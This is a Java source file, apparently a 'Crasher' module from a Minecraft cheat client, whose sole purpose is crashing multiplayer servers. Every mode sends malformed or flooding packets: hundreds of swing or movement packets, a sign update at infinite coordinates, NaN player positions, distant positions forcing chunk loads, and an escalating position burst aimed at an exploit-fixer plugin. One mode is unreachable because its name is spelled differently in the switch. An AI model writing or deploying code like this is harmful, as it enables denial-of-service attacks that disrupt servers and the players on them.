package wtf.atani.module.impl.misc;

import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;
import wtf.atani.event.events.UpdateEvent;
import wtf.atani.event.radbus.Listen;
import wtf.atani.module.Module;
import wtf.atani.module.data.ModuleInfo;
import wtf.atani.module.data.enums.Category;
import wtf.atani.value.impl.StringBoxValue;

import java.util.Random;

@ModuleInfo(name = "Crasher", description = "Tries to crash a server", category = Category.MISCELLANEOUS)
public class Crasher extends Module {

    public StringBoxValue mode = new StringBoxValue("Mode", "Which mode will the module use?", this, new String[]{"Swing", "Sign", "Paralyze", "Chunk Load", "NaN Position", "Exploit Fixer (Old)"});

    private Random random = new Random();

    @Listen
    public void onUpdate(UpdateEvent updateEvent) {
    	if(mc.thePlayer == null || mc.theWorld == null)
    		return;
        switch (mode.getValue()) {
            case "Swing":
                for (int i = 0; i < 300; i++)
                    sendPacketUnlogged(new C0APacketAnimation());
                break;
            case "Sign":
                final IChatComponent[] signText = new IChatComponent[]{new ChatComponentText(random.nextInt(1000000000) + ""), new ChatComponentText(random.nextInt(1000000000) + ""), new ChatComponentText(random.nextInt(1000000000) + ""), new ChatComponentText(random.nextInt(1000000000) + "")};
                sendPacketUnlogged(new C12PacketUpdateSign(new BlockPos(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY), signText));
                break;
            case "Paralyze":
                if (isInsidePlayer()) {
                    for (int loop = 0; loop < 500; ++loop) {
                        sendPacketUnlogged(new C03PacketPlayer(true));
                    }
                }
                break;
            case "Chunk Load":
                if (mc.thePlayer.ticksExisted % 10 == 0) {
                    mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
                            mc.thePlayer.posX + 99413,
                            mc.thePlayer.getEntityBoundingBox().minY,
                            mc.thePlayer.posZ + 99413,
                            true
                    ));

                }
                break;
            case "Nan Position":
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
                        Float.NaN,
                        Float.NaN,
                        Float.NaN,
                        true
                ));
                break;
            case "Exploit Fixer (Old)":
                for (int index = 0; index < 2500; ++index) {
                    sendPacketUnlogged(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 999 * index, mc.thePlayer.getEntityBoundingBox().minY + 999 * index, mc.thePlayer.posZ + 999 * index, true));
                }
                break;
        }
    }

    private boolean isInsidePlayer() {
        for (EntityPlayer entityPlayer : mc.theWorld.playerEntities) {
            if (entityPlayer instanceof EntityPlayerSP)
                continue;
            if (entityPlayer.getDistanceToEntity(mc.thePlayer) <= 0.995D) {
                return true;
            }
        }
        return false;
    }

    @Override
    public void onEnable() {

    }

    @Override
    public void onDisable() {

    }
}
